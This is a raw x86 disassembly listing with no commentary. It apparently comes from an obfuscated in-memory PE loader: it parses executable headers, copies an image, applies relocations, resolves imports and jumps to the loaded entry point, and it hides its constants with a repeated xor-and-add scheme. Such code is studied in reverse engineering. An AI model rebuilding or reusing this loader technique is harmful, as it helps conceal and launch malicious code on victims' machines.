  426477:	mov    BYTE PTR [ecx+0x8],0xf
  42647b:	mov    BYTE PTR [eax+0x1],0x11
  42647f:	mov    BYTE PTR [ecx+0x5],0x3
  426483:	leave  
  426484:	ret    0x4
  426487:	push   esi
  426488:	mov    ecx,edi
  42648a:	call   0x426458
  42648f:	mov    edx,edi
  426491:	mov    ecx,esi
  426493:	mov    BYTE PTR [esi],0x1f
  426496:	call   0x42642b
  42649b:	push   esi
  42649c:	mov    ecx,edi
  42649e:	mov    BYTE PTR [esi+0x5],0x3
  4264a2:	call   0x4263fc
  4264a7:	push   esi
  4264a8:	mov    BYTE PTR [esi+0x6],0xf
  4264ac:	call   0x4263c9
  4264b1:	mov    BYTE PTR [esi+0x2],0x14
  4264b5:	mov    edx,esi
  4264b7:	jmp    0x426399
  4264bc:	push   ebp
  4264bd:	mov    ebp,esp
  4264bf:	push   ecx
  4264c0:	mov    ecx,DWORD PTR [edx+0x194]
  4264c6:	push   esi
  4264c7:	mov    esi,DWORD PTR [ebp+0x8]
  4264ca:	mov    esi,DWORD PTR [esi]
  4264cc:	mov    DWORD PTR [ecx],esi
  4264ce:	mov    ecx,DWORD PTR [edx+0x194]
  4264d4:	mov    ecx,DWORD PTR [ecx]
  4264d6:	mov    esi,DWORD PTR [edx+0x190]
  4264dc:	mov    DWORD PTR [esi],ecx
  4264de:	mov    eax,DWORD PTR [edx+0x194]
  4264e4:	mov    ecx,DWORD PTR [eax]
  4264e6:	mov    ecx,DWORD PTR [ecx+0x3c]
  4264e9:	add    ecx,DWORD PTR [eax]
  4264eb:	mov    DWORD PTR [ebp-0x4],0xf89ca5b9
  4264f2:	mov    eax,DWORD PTR [ebp-0x4]
  4264f5:	movzx  ecx,WORD PTR [ecx+0x16]
  4264f9:	xor    eax,0x75108a8
  4264fe:	add    eax,0x3272ef
  426503:	pop    esi
  426504:	test   ecx,eax
  426506:	je     0x426514
  426508:	mov    eax,DWORD PTR [edx+0x1c8]
  42650e:	mov    DWORD PTR [eax],0xf89c85ba
  426514:	leave  
  426515:	ret    0x4
  426518:	push   ebp
  426519:	mov    ebp,esp
  42651b:	sub    esp,0x70
  42651e:	and    DWORD PTR [ebp-0x20],0x0
  426522:	mov    DWORD PTR [ebp-0x18],0xf89cb5b9
  426529:	mov    DWORD PTR [ebp-0x1c],0xf89c85f9
  426530:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  426537:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42653e:	mov    DWORD PTR [ebp-0x2c],0xf89f05b9
  426545:	mov    eax,DWORD PTR [ebp+0x20]
  426548:	mov    eax,DWORD PTR [eax+0x194]
  42654e:	mov    DWORD PTR [ebp-0xc],eax
  426551:	mov    eax,DWORD PTR [ebp+0x20]
  426554:	push   ebx
  426555:	push   esi
  426556:	mov    esi,DWORD PTR [eax+0x190]
  42655c:	mov    eax,DWORD PTR [ebp+0x20]
  42655f:	mov    eax,DWORD PTR [eax+0x18c]
  426565:	mov    DWORD PTR [ebp-0x8],eax
  426568:	mov    eax,DWORD PTR [eax]
  42656a:	push   edi
  42656b:	mov    DWORD PTR [ebp-0x4],esi
  42656e:	test   eax,eax
  426570:	jne    0x42657d
  426572:	push   DWORD PTR [ebp+0x1c]
  426575:	mov    edx,DWORD PTR [ebp+0x20]
  426578:	call   0x4264bc
  42657d:	mov    eax,DWORD PTR [esi]
  42657f:	mov    ebx,DWORD PTR [esi]
  426581:	add    ebx,DWORD PTR [eax+0x3c]
  426584:	mov    eax,DWORD PTR [ebp+0xc]
  426587:	mov    ecx,DWORD PTR [ebp-0x8]
  42658a:	mov    ecx,DWORD PTR [ecx]
  42658c:	mov    esi,0x75108a8
  426591:	xor    eax,esi
  426593:	mov    edi,0x3272ef
  426598:	add    eax,edi
  42659a:	cmp    eax,ecx
  42659c:	jne    0x4267d4
  4265a2:	mov    eax,DWORD PTR [ebp-0xc]
  4265a5:	mov    eax,DWORD PTR [eax]
  4265a7:	mov    DWORD PTR [ebp-0x10],eax
  4265aa:	mov    eax,DWORD PTR [ebx+0x50]
  4265ad:	mov    DWORD PTR [ebp-0x68],eax
  4265b0:	mov    eax,DWORD PTR [ebp-0x18]
  4265b3:	xor    eax,esi
  4265b5:	add    eax,edi
  4265b7:	mov    DWORD PTR [ebp-0x64],eax
  4265ba:	mov    eax,DWORD PTR [ebp-0x14]
  4265bd:	and    DWORD PTR [ebp-0x6c],0x0
  4265c1:	xor    eax,esi
  4265c3:	add    eax,edi
  4265c5:	mov    DWORD PTR [ebp-0x60],eax
  4265c8:	lea    eax,[ebp-0x70]
  4265cb:	push   eax
  4265cc:	mov    eax,DWORD PTR [ebp+0x8]
  4265cf:	xor    eax,esi
  4265d1:	add    eax,edi
  4265d3:	push   eax
  4265d4:	mov    eax,DWORD PTR [ebp+0x20]
  4265d7:	add    eax,0xaa
  4265dc:	push   eax
  4265dd:	mov    eax,DWORD PTR [ebp+0x20]
  4265e0:	mov    eax,DWORD PTR [eax+0x198]
  4265e6:	mov    DWORD PTR [ebp-0x70],0x4
  4265ed:	push   DWORD PTR [eax]
  4265ef:	mov    eax,DWORD PTR [ebp+0x10]
  4265f2:	call   eax
  4265f4:	mov    ecx,DWORD PTR [ebp-0xc]
  4265f7:	mov    ecx,DWORD PTR [ecx]
  4265f9:	mov    edx,DWORD PTR [ebp-0x8]
  4265fc:	mov    DWORD PTR [ebp-0x6c],eax
  4265ff:	mov    DWORD PTR [ebp+0x1c],eax
  426602:	mov    DWORD PTR [edx],ecx
  426604:	mov    ecx,DWORD PTR [ebp-0x4]
  426607:	mov    DWORD PTR [ecx],eax
  426609:	mov    eax,DWORD PTR [ebx+0x50]
  42660c:	mov    DWORD PTR [ebp-0x68],eax
  42660f:	mov    eax,DWORD PTR [ebp-0x1c]
  426612:	xor    eax,esi
  426614:	add    eax,edi
  426616:	mov    DWORD PTR [ebp-0x64],eax
  426619:	lea    eax,[ebp-0x20]
  42661c:	mov    DWORD PTR [ebp-0x60],eax
  42661f:	lea    eax,[ebp-0x70]
  426622:	push   eax
  426623:	mov    eax,DWORD PTR [ebp+0x8]
  426626:	xor    eax,esi
  426628:	add    eax,edi
  42662a:	push   eax
  42662b:	mov    eax,DWORD PTR [ebp+0x20]
  42662e:	add    eax,0xee
  426633:	push   eax
  426634:	mov    eax,DWORD PTR [ebp+0x20]
  426637:	mov    eax,DWORD PTR [eax+0x198]
  42663d:	mov    DWORD PTR [ebp-0x70],0x4
  426644:	push   DWORD PTR [eax]
  426646:	mov    eax,DWORD PTR [ebp+0x10]
  426649:	call   eax
  42664b:	test   eax,eax
  42664d:	je     0x426672
  42664f:	and    DWORD PTR [ebp+0xc],0x0
  426653:	cmp    DWORD PTR [ebx+0x50],0x0
  426657:	jbe    0x426672
  426659:	mov    eax,DWORD PTR [ebp+0x1c]
  42665c:	mov    ecx,DWORD PTR [ebp-0x10]
  42665f:	sub    ecx,eax
  426661:	mov    dl,BYTE PTR [ecx+eax*1]
  426664:	inc    DWORD PTR [ebp+0xc]
  426667:	mov    BYTE PTR [eax],dl
  426669:	mov    edx,DWORD PTR [ebp+0xc]
  42666c:	inc    eax
  42666d:	cmp    edx,DWORD PTR [ebx+0x50]
  426670:	jb     0x426661
  426672:	mov    edx,DWORD PTR [ebp+0x1c]
  426675:	mov    ecx,DWORD PTR [edx+0x3c]
  426678:	add    ecx,edx
  42667a:	mov    eax,DWORD PTR [ecx+0xa0]
  426680:	mov    ebx,DWORD PTR [ecx+0x28]
  426683:	add    eax,edx
  426685:	sub    edx,DWORD PTR [ebp-0x10]
  426688:	add    ebx,DWORD PTR [ebp+0x1c]
  42668b:	mov    DWORD PTR [ebp+0xc],edx
  42668e:	mov    DWORD PTR [ebp-0x2c],ecx
  426691:	mov    DWORD PTR [ebp-0x14],ebx
  426694:	mov    DWORD PTR [ebp-0x8],0x0
  42669b:	jmp    0x426717
  42669d:	add    edx,0xfffffff8
  4266a0:	shr    edx,1
  4266a2:	mov    DWORD PTR [ebp-0x18],edx
  4266a5:	je     0x426703
  4266a7:	lea    edx,[eax+0x8]
  4266aa:	mov    DWORD PTR [ebp-0x4],edx
  4266ad:	mov    edx,DWORD PTR [ebp-0x18]
  4266b0:	mov    DWORD PTR [ebp-0x18],edx
  4266b3:	mov    edx,DWORD PTR [ebp-0x4]
  4266b6:	movzx  edx,WORD PTR [edx]
  4266b9:	mov    DWORD PTR [ebp-0x24],edx
  4266bc:	and    edx,0xfff
  4266c2:	mov    DWORD PTR [ebp-0x28],edx
  4266c5:	mov    edx,DWORD PTR [ebp-0x24]
  4266c8:	shr    edx,0xc
  4266cb:	add    edx,0xffcd8d11
  4266d1:	xor    edx,esi
  4266d3:	cmp    edx,0xf89c85bc
  4266d9:	jne    0x4266fa
  4266db:	mov    edx,DWORD PTR [ebp-0x28]
  4266de:	add    edx,DWORD PTR [ebp+0x1c]
  4266e1:	mov    ebx,DWORD PTR [eax]
  4266e3:	cmp    DWORD PTR [ebx+edx*1],0x0
  4266e7:	je     0x4266f7
  4266e9:	mov    ecx,DWORD PTR [ebp+0xc]
  4266ec:	add    ecx,DWORD PTR [ebx+edx*1]
  4266ef:	mov    ebx,DWORD PTR [eax]
  4266f1:	mov    DWORD PTR [edx+ebx*1],ecx
  4266f4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4266f7:	mov    ebx,DWORD PTR [ebp-0x14]
  4266fa:	add    DWORD PTR [ebp-0x4],0x2
  4266fe:	dec    DWORD PTR [ebp-0x18]
  426701:	jne    0x4266b3
  426703:	mov    edx,DWORD PTR [ebp-0xc]
  426706:	add    DWORD PTR [ebp-0x8],edx
  426709:	mov    edx,DWORD PTR [ebp-0x8]
  42670c:	cmp    edx,DWORD PTR [ecx+0xa4]
  426712:	jae    0x426725
  426714:	add    eax,DWORD PTR [ebp-0xc]
  426717:	mov    edx,DWORD PTR [eax+0x4]
  42671a:	mov    DWORD PTR [ebp-0xc],edx
  42671d:	test   edx,edx
  42671f:	jne    0x42669d
  426725:	mov    eax,DWORD PTR [ebp-0x10]
  426728:	mov    DWORD PTR [ebp-0x6c],eax
  42672b:	mov    DWORD PTR [ebp-0x70],0x4
  426732:	mov    eax,DWORD PTR [ecx+0x50]
  426735:	mov    DWORD PTR [ebp-0x68],eax
  426738:	mov    eax,DWORD PTR [ebp-0x1c]
  42673b:	xor    eax,esi
  42673d:	add    eax,edi
  42673f:	mov    DWORD PTR [ebp-0x64],eax
  426742:	lea    eax,[ebp-0x20]
  426745:	mov    DWORD PTR [ebp-0x60],eax
  426748:	lea    eax,[ebp-0x70]
  42674b:	push   eax
  42674c:	mov    eax,DWORD PTR [ebp+0x8]
  42674f:	xor    eax,esi
  426751:	add    eax,edi
  426753:	push   eax
  426754:	mov    eax,DWORD PTR [ebp+0x20]
  426757:	add    eax,0xee
  42675c:	push   eax
  42675d:	mov    eax,DWORD PTR [ebp+0x20]
  426760:	mov    eax,DWORD PTR [eax+0x198]
  426766:	push   DWORD PTR [eax]
  426768:	mov    eax,DWORD PTR [ebp+0x10]
  42676b:	call   eax
  42676d:	mov    eax,DWORD PTR [ebp+0x20]
  426770:	mov    eax,DWORD PTR [eax+0x180]
  426776:	add    eax,DWORD PTR [ebp+0xc]
  426779:	mov    ecx,DWORD PTR [ebp+0xc]
  42677c:	push   DWORD PTR [ebp+0x18]
  42677f:	mov    DWORD PTR [eax],ecx
  426781:	push   DWORD PTR [ebp+0x14]
  426784:	push   DWORD PTR [ebp+0x1c]
  426787:	call   ebx
  426789:	mov    ecx,DWORD PTR [ebp+0xc]
  42678c:	add    ecx,DWORD PTR [ebp+0x20]
  42678f:	lea    eax,[ebp+0x4]
  426792:	mov    DWORD PTR [ebp+0x20],ecx
  426795:	mov    ecx,DWORD PTR [ebp+0x20]
  426798:	mov    ecx,DWORD PTR [ebp+0x20]
  42679b:	mov    edx,DWORD PTR [ecx+0x190]
  4267a1:	mov    ecx,DWORD PTR [ebp+0x20]
  4267a4:	mov    ecx,DWORD PTR [ecx+0x18c]
  4267aa:	mov    esi,DWORD PTR [ecx]
  4267ac:	cmp    DWORD PTR [eax],esi
  4267ae:	jb     0x4267cf
  4267b0:	mov    esi,DWORD PTR [edx]
  4267b2:	mov    edi,DWORD PTR [edx]
  4267b4:	mov    esi,DWORD PTR [esi+0x3c]
  4267b7:	lea    esi,[edi+esi*1+0x50]
  4267bb:	mov    edi,DWORD PTR [ecx]
  4267bd:	add    edi,DWORD PTR [esi]
  4267bf:	cmp    DWORD PTR [eax],edi
  4267c1:	jae    0x4267cf
  4267c3:	mov    esi,DWORD PTR [ecx]
  4267c5:	mov    ecx,DWORD PTR [eax]
  4267c7:	mov    edx,DWORD PTR [edx]
  4267c9:	sub    ecx,esi
  4267cb:	add    edx,ecx
  4267cd:	mov    DWORD PTR [eax],edx
  4267cf:	mov    eax,DWORD PTR [ebp+0xc]
  4267d2:	jmp    0x4267d6
  4267d4:	xor    eax,eax
  4267d6:	pop    edi
  4267d7:	pop    esi
  4267d8:	pop    ebx
  4267d9:	leave  
  4267da:	ret    0x1c
  4267dd:	push   ebp
  4267de:	mov    ebp,esp
  4267e0:	sub    esp,0x1c
  4267e3:	push   esi
  4267e4:	mov    esi,eax
  4267e6:	mov    eax,DWORD PTR [ecx+0x190]
  4267ec:	cmp    DWORD PTR [eax],0x0
  4267ef:	je     0x4268ff
  4267f5:	test   edx,edx
  4267f7:	je     0x4268ff
  4267fd:	test   esi,esi
  4267ff:	je     0x4268ff
  426805:	mov    eax,DWORD PTR [esi+0x88]
  42680b:	test   eax,eax
  42680d:	je     0x4268fa
  426813:	cmp    DWORD PTR [esi+0x8c],0x10
  42681a:	je     0x4268fa
  426820:	cmp    DWORD PTR [esi+0x34],edx
  426823:	je     0x4268fa
  426829:	mov    esi,DWORD PTR [ecx+0x18c]
  42682f:	and    DWORD PTR [ebp-0x10],0x0
  426833:	mov    ecx,edx
  426835:	sub    ecx,DWORD PTR [esi]
  426837:	add    eax,edx
  426839:	movzx  edx,WORD PTR [eax+0xc]
  42683d:	mov    DWORD PTR [ebp-0x1c],ecx
  426840:	movzx  ecx,WORD PTR [eax+0xe]
  426844:	add    ecx,edx
  426846:	je     0x4268fa
  42684c:	lea    ecx,[eax+0x14]
  42684f:	push   ebx
  426850:	mov    DWORD PTR [ebp-0x18],ecx
  426853:	mov    esi,0x7fffffff
  426858:	push   edi
  426859:	test   DWORD PTR [ecx],esi
  42685b:	je     0x4268dc
  42685d:	mov    edx,DWORD PTR [ecx]
  42685f:	and    DWORD PTR [ebp-0xc],0x0
  426863:	and    edx,esi
  426865:	add    edx,eax
  426867:	movzx  edi,WORD PTR [edx+0xe]
  42686b:	movzx  ebx,WORD PTR [edx+0xc]
  42686f:	add    edi,ebx
  426871:	je     0x4268dc
  426873:	lea    ecx,[edx+0x14]
  426876:	mov    DWORD PTR [ebp-0x14],ecx
  426879:	test   DWORD PTR [ecx],esi
  42687b:	je     0x4268be
  42687d:	mov    ecx,DWORD PTR [ecx]
  42687f:	and    DWORD PTR [ebp-0x8],0x0
  426883:	and    ecx,esi
  426885:	add    ecx,eax
  426887:	movzx  edi,WORD PTR [ecx+0xe]
  42688b:	movzx  ebx,WORD PTR [ecx+0xc]
  42688f:	add    edi,ebx
  426891:	je     0x4268be
  426893:	lea    edi,[ecx+0x14]
  426896:	mov    DWORD PTR [ebp-0x4],edi
  426899:	mov    edi,DWORD PTR [ebp-0x4]
  42689c:	mov    edi,DWORD PTR [edi]
  42689e:	test   edi,edi
  4268a0:	je     0x4268a8
  4268a2:	mov    ebx,DWORD PTR [ebp-0x1c]
  4268a5:	add    DWORD PTR [edi+eax*1],ebx
  4268a8:	movzx  edi,WORD PTR [ecx+0xe]
  4268ac:	movzx  ebx,WORD PTR [ecx+0xc]
  4268b0:	inc    DWORD PTR [ebp-0x8]
  4268b3:	add    DWORD PTR [ebp-0x4],0x8
  4268b7:	add    edi,ebx
  4268b9:	cmp    DWORD PTR [ebp-0x8],edi
  4268bc:	jb     0x426899
  4268be:	movzx  edi,WORD PTR [edx+0xe]
  4268c2:	movzx  ebx,WORD PTR [edx+0xc]
  4268c6:	mov    ecx,DWORD PTR [ebp-0x14]
  4268c9:	inc    DWORD PTR [ebp-0xc]
  4268cc:	add    ecx,0x8
  4268cf:	add    edi,ebx
  4268d1:	mov    DWORD PTR [ebp-0x14],ecx
  4268d4:	cmp    DWORD PTR [ebp-0xc],edi
  4268d7:	jb     0x426879
  4268d9:	mov    ecx,DWORD PTR [ebp-0x18]
  4268dc:	movzx  edx,WORD PTR [eax+0xe]
  4268e0:	movzx  edi,WORD PTR [eax+0xc]
  4268e4:	inc    DWORD PTR [ebp-0x10]
  4268e7:	add    ecx,0x8
  4268ea:	add    edx,edi
  4268ec:	mov    DWORD PTR [ebp-0x18],ecx
  4268ef:	cmp    DWORD PTR [ebp-0x10],edx
  4268f2:	jb     0x426859
  4268f8:	pop    edi
  4268f9:	pop    ebx
  4268fa:	xor    eax,eax
  4268fc:	inc    eax
  4268fd:	jmp    0x426901
  4268ff:	xor    eax,eax
  426901:	pop    esi
  426902:	leave  
  426903:	ret    
  426904:	push   ebp
  426905:	mov    ebp,esp
  426907:	mov    ecx,DWORD PTR [ecx+0x190]
  42690d:	mov    eax,DWORD PTR [ebp+0xc]
  426910:	sub    esp,0x10
  426913:	push   ebx
  426914:	xor    ebx,ebx
  426916:	push   esi
  426917:	push   edi
  426918:	cmp    DWORD PTR [ecx],ebx
  42691a:	je     0x4269a2
  426920:	cmp    eax,ebx
  426922:	je     0x4269a2
  426924:	cmp    DWORD PTR [eax+0x78],ebx
  426927:	jne    0x42692e
  426929:	xor    eax,eax
  42692b:	inc    eax
  42692c:	jmp    0x4269a4
  42692e:	mov    eax,DWORD PTR [eax+0x78]
  426931:	add    eax,DWORD PTR [ebp+0x8]
  426934:	mov    ecx,DWORD PTR [eax+0x1c]
  426937:	mov    edx,DWORD PTR [eax+0x24]
  42693a:	mov    esi,DWORD PTR [eax+0x14]
  42693d:	mov    edi,DWORD PTR [eax+0x18]
  426940:	add    ecx,DWORD PTR [ebp+0x8]
  426943:	add    edx,DWORD PTR [ebp+0x8]
  426946:	mov    DWORD PTR [ebp-0x4],esi
  426949:	cmp    esi,edi
  42694b:	ja     0x426950
  42694d:	mov    DWORD PTR [ebp-0x4],edi
  426950:	mov    DWORD PTR [ebp-0x8],ebx
  426953:	cmp    DWORD PTR [ebp-0x4],ebx
  426956:	jbe    0x426929
  426958:	cmp    ebx,DWORD PTR [eax+0x14]
  42695b:	jae    0x426963
  42695d:	movzx  esi,WORD PTR [edx+ebx*2]
  426961:	jmp    0x426965
  426963:	mov    esi,ebx
  426965:	lea    esi,[ecx+esi*4]
  426968:	mov    edi,DWORD PTR [esi]
  42696a:	test   edi,edi
  42696c:	je     0x426997
  42696e:	add    edi,DWORD PTR [ebp+0x8]
  426971:	mov    DWORD PTR [ebp-0x10],edi
  426974:	cmp    edi,eax
  426976:	jbe    0x426988
  426978:	mov    ebx,DWORD PTR [ebp+0xc]
  42697b:	mov    ebx,DWORD PTR [ebx+0x7c]
  42697e:	add    ebx,eax
  426980:	cmp    edi,ebx
  426982:	jae    0x426988
  426984:	mov    esi,DWORD PTR [esi]
  426986:	jmp    0x426990
  426988:	sub    edi,DWORD PTR [ebp+0x8]
  42698b:	mov    DWORD PTR [esi],edi
  42698d:	mov    esi,DWORD PTR [ebp-0x10]
  426990:	test   esi,esi
  426992:	je     0x4269a2
  426994:	mov    ebx,DWORD PTR [ebp-0x8]
  426997:	inc    ebx
  426998:	mov    DWORD PTR [ebp-0x8],ebx
  42699b:	cmp    ebx,DWORD PTR [ebp-0x4]
  42699e:	jb     0x426958
  4269a0:	jmp    0x426929
  4269a2:	xor    eax,eax
  4269a4:	pop    edi
  4269a5:	pop    esi
  4269a6:	pop    ebx
  4269a7:	leave  
  4269a8:	ret    0x8
  4269ab:	push   ebp
  4269ac:	mov    ebp,esp
  4269ae:	sub    esp,0x2c
  4269b1:	mov    edx,0xf89c85b9
  4269b6:	mov    DWORD PTR [ebp-0x4],edx
  4269b9:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  4269c0:	mov    eax,DWORD PTR [ebp-0x4]
  4269c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4269c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4269c9:	mov    ecx,DWORD PTR [ebp-0x4]
  4269cc:	mov    ecx,DWORD PTR [ebp-0x4]
  4269cf:	mov    ecx,DWORD PTR [ebp-0x4]
  4269d2:	push   ebx
  4269d3:	mov    ebx,DWORD PTR [ebp+0x10]
  4269d6:	push   esi
  4269d7:	mov    esi,0x75108a8
  4269dc:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  4269e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4269e6:	mov    ebx,DWORD PTR [ebx+0x190]
  4269ec:	push   edi
  4269ed:	mov    edi,0x3272ef
  4269f2:	xor    ecx,esi
  4269f4:	xor    eax,esi
  4269f6:	add    eax,edi
  4269f8:	add    ecx,edi
  4269fa:	mov    DWORD PTR [ebp-0x18],eax
  4269fd:	cmp    ecx,DWORD PTR [ebx]
  4269ff:	je     0x426c80
  426a05:	mov    ebx,DWORD PTR [ebp-0x4]
  426a08:	mov    ecx,DWORD PTR [ebp+0xc]
  426a0b:	xor    ebx,esi
  426a0d:	add    ebx,edi
  426a0f:	cmp    ebx,ecx
  426a11:	je     0x426c80
  426a17:	mov    ebx,DWORD PTR [ebp-0x4]
  426a1a:	mov    ecx,DWORD PTR [ecx+0x80]
  426a20:	xor    ebx,esi
  426a22:	add    ebx,edi
  426a24:	cmp    ecx,ebx
  426a26:	je     0x426c7b
  426a2c:	add    ecx,DWORD PTR [ebp+0x8]
  426a2f:	mov    DWORD PTR [ebp-0x2c],ecx
  426a32:	mov    ebx,edx
  426a34:	xor    ebx,esi
  426a36:	add    ebx,edi
  426a38:	mov    DWORD PTR [ebp-0x10],ebx
  426a3b:	mov    ebx,DWORD PTR [ebp-0x10]
  426a3e:	cmp    ebx,edx
  426a40:	je     0x426a54
  426a42:	mov    edx,DWORD PTR [ebp-0x10]
  426a45:	mov    ebx,DWORD PTR [ebp-0x4]
  426a48:	imul   edx,edx,0x14
  426a4b:	xor    ebx,esi
  426a4d:	add    ebx,edi
  426a4f:	cmp    DWORD PTR [edx+ecx*1],ebx
  426a52:	jne    0x426a6b
  426a54:	mov    edx,DWORD PTR [ebp-0x10]
  426a57:	mov    ebx,DWORD PTR [ebp-0x4]
  426a5a:	imul   edx,edx,0x14
  426a5d:	xor    ebx,esi
  426a5f:	add    ebx,edi
  426a61:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  426a65:	je     0x426c6d
  426a6b:	mov    eax,DWORD PTR [ebp-0x4]
  426a6e:	mov    ebx,DWORD PTR [ebp-0x4]
  426a71:	mov    eax,DWORD PTR [ebp-0x10]
  426a74:	imul   eax,eax,0x14
  426a77:	add    eax,ecx
  426a79:	mov    ecx,DWORD PTR [eax+0x10]
  426a7c:	add    ecx,DWORD PTR [ebp+0x8]
  426a7f:	xor    ebx,esi
  426a81:	mov    DWORD PTR [ebp-0x1c],ecx
  426a84:	mov    ecx,DWORD PTR [ebp-0x4]
  426a87:	mov    edx,DWORD PTR [ebp-0x4]
  426a8a:	xor    ecx,esi
  426a8c:	add    ecx,edi
  426a8e:	xor    edx,esi
  426a90:	mov    DWORD PTR [ebp-0x24],ecx
  426a93:	mov    ecx,DWORD PTR [eax]
  426a95:	add    edx,edi
  426a97:	add    ebx,edi
  426a99:	cmp    ecx,edx
  426a9b:	je     0x426aa3
  426a9d:	add    ecx,DWORD PTR [ebp+0x8]
  426aa0:	mov    DWORD PTR [ebp-0x24],ecx
  426aa3:	mov    ecx,DWORD PTR [ebp-0x4]
  426aa6:	xor    ecx,esi
  426aa8:	add    ecx,DWORD PTR [eax+0xc]
  426aab:	mov    eax,DWORD PTR [ebp+0x8]
  426aae:	lea    eax,[ecx+eax*1+0x3272ef]
  426ab5:	mov    DWORD PTR [ebp+0xc],eax
  426ab8:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  426abf:	mov    eax,DWORD PTR [ebp+0x10]
  426ac2:	push   DWORD PTR [ebp+0xc]
  426ac5:	mov    eax,DWORD PTR [eax+0x1e0]
  426acb:	call   DWORD PTR [eax]
  426acd:	mov    ecx,DWORD PTR [ebp-0x4]
  426ad0:	xor    ecx,esi
  426ad2:	add    ecx,edi
  426ad4:	mov    DWORD PTR [ebp-0xc],eax
  426ad7:	cmp    ecx,eax
  426ad9:	jne    0x426aed
  426adb:	mov    eax,DWORD PTR [ebp+0x10]
  426ade:	push   DWORD PTR [ebp+0xc]
  426ae1:	mov    eax,DWORD PTR [eax+0x1e0]
  426ae7:	call   DWORD PTR [eax+0xc]
  426aea:	mov    DWORD PTR [ebp-0xc],eax
  426aed:	mov    DWORD PTR [ebp-0x20],0x7f661b22
  426af4:	mov    DWORD PTR [ebp-0x20],0xf89c9852
  426afb:	mov    eax,DWORD PTR [ebp-0x4]
  426afe:	xor    eax,esi
  426b00:	add    eax,edi
  426b02:	cmp    eax,DWORD PTR [ebp-0xc]
  426b05:	jne    0x426b2a
  426b07:	mov    eax,DWORD PTR [ebp-0x8]
  426b0a:	mov    ecx,DWORD PTR [ebp-0x20]
  426b0d:	xor    eax,esi
  426b0f:	xor    ecx,esi
  426b11:	lea    ebx,[ebx+eax*1+0x3272ef]
  426b18:	mov    eax,DWORD PTR [ebp+0x10]
  426b1b:	mov    eax,DWORD PTR [eax+0x1e0]
  426b21:	add    ecx,edi
  426b23:	imul   ecx,ebx
  426b26:	push   ecx
  426b27:	call   DWORD PTR [eax+0x24]
  426b2a:	mov    eax,DWORD PTR [ebp-0x4]
  426b2d:	xor    eax,esi
  426b2f:	add    eax,edi
  426b31:	cmp    eax,DWORD PTR [ebp-0xc]
  426b34:	jne    0x426b45
  426b36:	mov    eax,DWORD PTR [ebp-0x28]
  426b39:	xor    eax,esi
  426b3b:	add    eax,edi
  426b3d:	cmp    ebx,eax
  426b3f:	jbe    0x426abf
  426b45:	mov    eax,DWORD PTR [ebp-0x4]
  426b48:	xor    eax,esi
  426b4a:	add    eax,edi
  426b4c:	cmp    eax,DWORD PTR [ebp-0xc]
  426b4f:	jne    0x426b68
  426b51:	mov    eax,DWORD PTR [ebp-0x8]
  426b54:	mov    ecx,DWORD PTR [ebp-0x18]
  426b57:	xor    eax,esi
  426b59:	lea    eax,[ecx+eax*1+0x3272ef]
  426b60:	mov    DWORD PTR [ebp-0x18],eax
  426b63:	jmp    0x426c57
  426b68:	mov    DWORD PTR [ebp-0x14],0x1121b21
  426b6f:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  426b76:	mov    ebx,DWORD PTR [ebp-0x4]
  426b79:	xor    ebx,esi
  426b7b:	add    ebx,edi
  426b7d:	jmp    0x426c44
  426b82:	mov    eax,DWORD PTR [ebp-0x4]
  426b85:	xor    eax,esi
  426b87:	add    eax,edi
  426b89:	mov    DWORD PTR [ebp-0x14],eax
  426b8c:	mov    eax,DWORD PTR [ebp-0x4]
  426b8f:	xor    eax,esi
  426b91:	add    eax,edi
  426b93:	mov    DWORD PTR [ebp+0xc],eax
  426b96:	mov    ecx,DWORD PTR [ebp-0x4]
  426b99:	mov    eax,DWORD PTR [ebp-0x24]
  426b9c:	xor    ecx,esi
  426b9e:	add    ecx,edi
  426ba0:	cmp    ecx,eax
  426ba2:	je     0x426baa
  426ba4:	mov    eax,DWORD PTR [eax+ebx*4]
  426ba7:	mov    DWORD PTR [ebp-0x14],eax
  426baa:	mov    eax,DWORD PTR [ebp-0x1c]
  426bad:	mov    eax,DWORD PTR [eax+ebx*4]
  426bb0:	mov    DWORD PTR [ebp+0xc],eax
  426bb3:	mov    eax,DWORD PTR [ebp-0x4]
  426bb6:	mov    ecx,DWORD PTR [ebp-0x14]
  426bb9:	xor    eax,esi
  426bbb:	add    eax,edi
  426bbd:	cmp    eax,ecx
  426bbf:	je     0x426bea
  426bc1:	mov    eax,DWORD PTR [ebp-0x4]
  426bc4:	mov    ecx,DWORD PTR [ebp-0x14]
  426bc7:	xor    eax,esi
  426bc9:	add    eax,edi
  426bcb:	shr    ecx,0x1f
  426bce:	cmp    eax,ecx
  426bd0:	je     0x426bea
  426bd2:	mov    ecx,DWORD PTR [ebp-0x14]
  426bd5:	mov    eax,DWORD PTR [ebp+0x10]
  426bd8:	mov    eax,DWORD PTR [eax+0x1e0]
  426bde:	movzx  ecx,cx
  426be1:	push   ecx
  426be2:	push   DWORD PTR [ebp-0xc]
  426be5:	call   DWORD PTR [eax+0x8]
  426be8:	jmp    0x426c03
  426bea:	mov    eax,DWORD PTR [ebp+0xc]
  426bed:	add    eax,DWORD PTR [ebp+0x8]
  426bf0:	mov    ecx,DWORD PTR [ebp+0x10]
  426bf3:	mov    ecx,DWORD PTR [ecx+0x1e0]
  426bf9:	add    eax,0x2
  426bfc:	push   eax
  426bfd:	push   DWORD PTR [ebp-0xc]
  426c00:	call   DWORD PTR [ecx+0x8]
  426c03:	mov    DWORD PTR [ebp+0xc],eax
  426c06:	mov    eax,DWORD PTR [ebp-0x4]
  426c09:	mov    ecx,DWORD PTR [ebp+0xc]
  426c0c:	xor    eax,esi
  426c0e:	add    eax,edi
  426c10:	cmp    eax,ecx
  426c12:	mov    eax,DWORD PTR [ebp-0x8]
  426c15:	jne    0x426c28
  426c17:	mov    ecx,DWORD PTR [ebp-0x18]
  426c1a:	xor    eax,esi
  426c1c:	lea    eax,[ecx+eax*1+0x3272ef]
  426c23:	mov    DWORD PTR [ebp-0x18],eax
  426c26:	jmp    0x426c38
  426c28:	mov    ecx,DWORD PTR [ebp+0xc]
